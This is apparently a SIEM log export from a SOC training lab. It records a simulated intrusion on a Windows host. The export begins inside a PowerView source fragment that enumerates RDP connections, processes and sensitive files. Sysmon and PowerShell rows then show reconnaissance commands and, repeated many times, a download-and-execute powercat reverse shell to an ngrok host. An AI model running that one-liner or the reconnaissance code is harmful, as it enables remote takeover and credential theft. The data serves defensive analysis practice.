SilentlyContinue            }        }        catch {            Write-Warning ""Error accessing $ComputerName, likely insufficient permissions or firewall rules on host""        }        if(!$Reg) {            Write-Warning ""Error accessing $ComputerName, likely insufficient permissions or firewall rules on host""        }        else {            # extract out the SIDs of domain users in this hive            $UserSIDs = ($Reg.EnumKey($HKU, """")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }            foreach ($UserSID in $UserSIDs) {                try {                    $UserName = Convert-SidToName $UserSID                    # pull out all the cached RDP connections                    $ConnectionKeys = $Reg.EnumValues($HKU,""$UserSID\Software\Microsoft\Terminal Server Client\Default"").sNames                    foreach ($Connection in $ConnectionKeys) {                        # make sure this key is a cached connection                        if($Connection -match 'MRU.*') {                            $TargetServer = $Reg.GetStringValue($HKU, ""$UserSID\Software\Microsoft\Terminal Server Client\Default"", $Connection).sValue                                                        $FoundConnection = New-Object PSObject                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $ComputerName                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null                            $FoundConnection                        }                    }                    # pull out all the cached server info with username hints                    $ServerKeys = $Reg.EnumKey($HKU,""$UserSID\Software\Microsoft\Terminal Server Client\Servers"").sNames                    foreach ($Server in $ServerKeys) {                        $UsernameHint = $Reg.GetStringValue($HKU, ""$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server"", 'UsernameHint').sValue                                                $FoundConnection = New-Object PSObject                        $FoundConnection | Add-Member Noteproperty 'ComputerName' $ComputerName                        $FoundConnection | Add-Member Noteproperty 'UserName' $UserName                        $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID                        $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server                        $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint                        $FoundConnection                       }                }                catch {                    Write-Debug ""Error: $_""                }            }        }    }}function Get-NetProcess {<#    .SYNOPSIS        Gets a list of processes/owners on a remote machine.    .PARAMETER ComputerName        The hostname to query processes. Defaults to the local host name.    .PARAMETER RemoteUserName        The ""domain\username"" to use for the WMI call on a remote system.        If supplied, 'RemotePassword' must be supplied as well.    .PARAMETER RemotePassword        The password to use for the WMI call on a remote system.    .EXAMPLE        PS C:\> Get-NetProcess -ComputerName WINDOWS1            Returns the current processes for WINDOWS1#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $ComputerName,        [String]        $RemoteUserName,        [String]        $RemotePassword    )    process {                if($ComputerName) {            # process multiple host object types from the pipeline            $ComputerName = Get-NameField -Object $ComputerName                  }        else {            # default to the local hostname            $ComputerName = [System.Net.Dns]::GetHostName()        }        $Credential = $Null        if($RemoteUserName) {            if($RemotePassword) {                $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)                # try to enumerate the processes on the remote machine using the supplied credential                try {                    Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential | ForEach-Object {                        $Owner = $_.getowner();                        $Process = New-Object PSObject                        $Process | Add-Member Noteproperty 'ComputerName' $ComputerName                        $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName                        $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID                        $Process | Add-Member Noteproperty 'Domain' $Owner.Domain                        $Process | Add-Member Noteproperty 'User' $Owner.User                        $Process                    }                }                catch {                    Write-Verbose ""[!] Error enumerating remote processes, access likely denied: $_""                }            }            else {                Write-Warning ""[!] RemotePassword must also be supplied!""            }        }        else {            # try to enumerate the processes on the remote machine            try {                Get-WMIobject -Class Win32_process -ComputerName $ComputerName | ForEach-Object {                    $Owner = $_.getowner();                    $Process = New-Object PSObject                    $Process | Add-Member Noteproperty 'ComputerName' $ComputerName                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID                    $Process | Add-Member Noteproperty 'Domain' $Owner.Domain                    $Process | Add-Member Noteproperty 'User' $Owner.User                    $Process                }            }            catch {                Write-Verbose ""[!] Error enumerating remote processes, access likely denied: $_""            }        }    }}function Find-InterestingFile {<#    .SYNOPSIS        This function recursively searches a given UNC path for files with        specific keywords in the name (default of pass, sensitive, secret, admin,        login and unattend*.xml). The output can be piped out to a csv with the        -OutFile flag. By default, hidden files/folders are included in search results.    .PARAMETER Path        UNC/local path to recursively search.    .PARAMETER Terms        Terms to search for.    .PARAMETER OfficeDocs        Switch. Search for office documents (*.doc*, *.xls*, *.ppt*)    .PARAMETER FreshEXEs        Switch. Find .EXEs accessed within the last week.    .PARAMETER LastAccessTime        Only return files with a LastAccessTime greater than this date value.    .PARAMETER LastWriteTime        Only return files with a LastWriteTime greater than this date value.    .PARAMETER CreationTime        Only return files with a CreationTime greater than this date value.    .PARAMETER ExcludeFolders        Switch. Exclude folders from the search results.    .PARAMETER ExcludeHidden        Switch. Exclude hidden files and folders from the search results.    .PARAMETER CheckWriteAccess        Switch. Only returns files the current user has write access to.    .PARAMETER OutFile        Output results to a specified csv output file.    .PARAMETER UsePSDrive        Switch. Mount target remote path with temporary PSDrives.    .PARAMETER Credential        Credential to use to mount the PSDrive for searching.    .OUTPUTS        The full path, owner, lastaccess time, lastwrite time, and size for each found file.    .EXAMPLE        PS C:\> Find-InterestingFile -Path C:\Backup\                Returns any files on the local path C:\Backup\ that have the default        search term set in the title.    .EXAMPLE        PS C:\> Find-InterestingFile -Path \\WINDOWS7\Users\ -Terms salaries,email -OutFile out.csv                Returns any files on the remote path \\WINDOWS7\Users\ that have 'salaries'        or 'email' in the title, and writes the results out to a csv file        named 'out.csv'    .EXAMPLE        PS C:\> Find-InterestingFile -Path \\WINDOWS7\Users\ -LastAccessTime (Get-Date).AddDays(-7)        Returns any files on the remote path \\WINDOWS7\Users\ that have the default        search term set in the title and were accessed within the last week.    .LINK                http://www.harmj0y.net/blog/redteaming/file-server-triage-on-red-team-engagements/#>    [CmdletBinding()]    param(        [Parameter(ValueFromPipeline=$True)]        [String]        $Path = '.\',        [String[]]        $Terms,        [Switch]        $OfficeDocs,        [Switch]        $FreshEXEs,        [String]        $LastAccessTime,        [String]        $LastWriteTime,        [String]        $Creatio","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"-3V3ypsB8mE-0EyZUH5P","-",logs,"-",None," We have exciting new materials and innovative designs that we would love to showcase Let us know if you would like samples or a walkthrough",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","cain.omoore@tryhatme.com","-","-","-","skinner@fashionhatchronicle.com","Vendor Showcase: Latest Hat Materials and Designs","Jan 17, 2026 @ 02:39:30.304","-"
"_HV3ypsB8mE-0EyZVH4e","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Temp\5\__PSScriptPolicyTest_b1baaotg.vsb.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",3728,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:25.304","-"
"_nV3ypsB8mE-0EyZWH4I","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","-","win-3450","Creating Scriptblock text (1 of 1):powershell -ExecutionPolicy BypassScriptBlock ID: 97841cd9-618d-4351-8ee2-73e578719b23Path: ","-","-","-","powershell -ExecutionPolicy Bypass","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:24.304","9,060"
"_3V3ypsB8mE-0EyZa36n","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\Downloads\PowerView.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",9060,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:11.304","-"
"9XV2ypsB8mE-0EyZ134h","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3457","-","-","-","-","-","""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"" ","OUTLOOK.EXE","explorer.exe",3888,3572,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:00.304","-"
"8nV2ypsB8mE-0EyZrH4-","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\net.exe"" localgroup","net.exe","powershell.exe",9060,892,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:45.304","-"
"-XV3ypsB8mE-0EyZLX4r","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","C:\Windows\system32\net1 localgroup","net1.exe","net.exe",892,6576,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:45.304","-"
"83V2ypsB8mE-0EyZt37e","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\net.exe"" user","net.exe","powershell.exe",9060,7336,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:38.304","-"
"-HV2ypsB8mE-0EyZ8n6V","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","C:\Windows\system32\net1 user","net1.exe","net.exe",7336,7796,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:38.304","-"
"9nV2ypsB8mE-0EyZ1343","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\whoami.exe"" /priv","whoami.exe","powershell.exe",9060,4016,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:32.304","-"
"9HV2ypsB8mE-0EyZu36-","-",logs,"-",None," Attached are some design mockups and pricing options Let us know if you have any adjustments or additional requests",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","liam.espinoza@tryhatme.com","-","-","-","boone@theheadwearhub.com","RE: Inquiry: Custom Hat Order for Corporate Gifting","Jan 17, 2026 @ 02:38:30.304","-"
"8HV2ypsB8mE-0EyZoH5h","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\whoami.exe""","whoami.exe","powershell.exe",9060,8168,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:24.304","-"
"93V2ypsB8mE-0EyZ1345","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\system32\systeminfo.exe""","systeminfo.exe","powershell.exe",9060,3524,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:16.304","-"
"2XV2ypsB8mE-0EyZCH46","-",logs,"-",None," Let’s make sure we address last week’s concerns.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","kyra.flores@tryhatme.com","-","-","-","kyra.flores@tryhatme.com","RE: RE: New Hat Designs - Team Meeting Tomorrow","Jan 17, 2026 @ 02:38:12.304","-"
"13V1ypsB8mE-0EyZ_H7T","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3455","-","-","-","-","-","C:\Windows\System32\mousocoreworker.exe -Embedding","MoUsoCoreWorker.exe","-",3604,3747,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:07.304","-"
"1nV1ypsB8mE-0EyZ_H5a","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""StreamDestinationBuffer""] = (New-Object System.Byte[] $FuncVars[""BufferSize""]). Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=33	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""StreamDestinationBuffer""] = (New-Object System.Byte[] $FuncVars[""BufferSize""]) Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Byte[]""ParameterBinding(New-Object): name=""ArgumentList""; value=""131072""","-","""New-Object"", ""System.Byte[]"", ""131072""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"1XV1ypsB8mE-0EyZ-H57","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""StdErrDestinationBuffer""] = New-Object System.Byte[] 65536. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=47	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""StdErrDestinationBuffer""] = New-Object System.Byte[] 65536 Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Byte[]""ParameterBinding(New-Object): name=""ArgumentList""; value=""65536""","-","""New-Object"", ""System.Byte[]"", ""65536""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"2nV2ypsB8mE-0EyZC37_","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""StdOutDestinationBuffer""] = New-Object System.Byte[] 65536. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=45	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""StdOutDestinationBuffer""] = New-Object System.Byte[] 65536 Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Byte[]""ParameterBinding(New-Object): name=""ArgumentList""; value=""65536""","-","""New-Object"", ""System.Byte[]"", ""65536""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"1HV1ypsB8mE-0EyZ7H7j","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       $Socket = New-Object System.Net.Sockets.TcpClient. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=27	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      $Socket = New-Object System.Net.Sockets.TcpClient Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Net.Sockets.TcpClient""","-","""New-Object"", ""System.Net.Sockets.TcpClient""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"2HV2ypsB8mE-0EyZBH5M","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       Write-Verbose ""Setting up Stream 1..."". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=25	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      Write-Verbose ""Setting up Stream 1..."" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Setting up Stream 1...""","-","""Write-Verbose"", ""Setting up Stream 1...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"7XV2ypsB8mE-0EyZiX4A","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       $Encoding = New-Object System.Text.AsciiEncoding. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=23	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      $Encoding = New-Object System.Text.AsciiEncoding Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Text.AsciiEncoding""","-","""New-Object"", ""System.Text.AsciiEncoding""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"6XV2ypsB8mE-0EyZeX55","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     Write-Verbose ""Set Stream 2: Process"". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=21	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    Write-Verbose ""Set Stream 2: Process"" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Set Stream 2: Process""","-","""Write-Verbose"", ""Set Stream 2: Process""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"73V2ypsB8mE-0EyZnH67","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       Write-Verbose ""Both Communication Streams Established. Redirecting Data Between Streams..."". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=51	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      Write-Verbose ""Both Communication Streams Established. Redirecting Data Between Streams..."" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Both Communication Streams Established. Redirecting Data Between Streams...""","-","""Write-Verbose"", ""Both Communication Streams Established. Redirecting Data Between Streams...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"63V2ypsB8mE-0EyZhX4T","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       Write-Verbose ""Setting up Stream 2..."". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=37	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      Write-Verbose ""Setting up Stream 2..."" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Setting up Stream 2...""","-","""Write-Verbose"", ""Setting up Stream 2...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"7nV2ypsB8mE-0EyZmH6f","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     Write-Verbose ""Set Stream 1: TCP"". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=19	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    Write-Verbose ""Set Stream 1: TCP"" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Set Stream 1: TCP""","-","""Write-Verbose"", ""Set Stream 1: TCP""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"53V2ypsB8mE-0EyZbX6h","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:       Write-Verbose ""Connecting..."". Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=29	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=      Write-Verbose ""Connecting..."" Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Connecting...""","-","""Write-Verbose"", ""Connecting...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"8XV2ypsB8mE-0EyZpH5M","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Temp\5\__PSScriptPolicyTest_saoz2amx.mg5.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",6492,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"43V2ypsB8mE-0EyZSn58","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     Write-Verbose (""Starting Process "" + $FuncSetupVars[0] + ""...""). Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=41	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    Write-Verbose (""Starting Process "" + $FuncSetupVars[0] + ""..."") Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Starting Process powershell...""","-","""Write-Verbose"", ""Starting Process powershell...""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
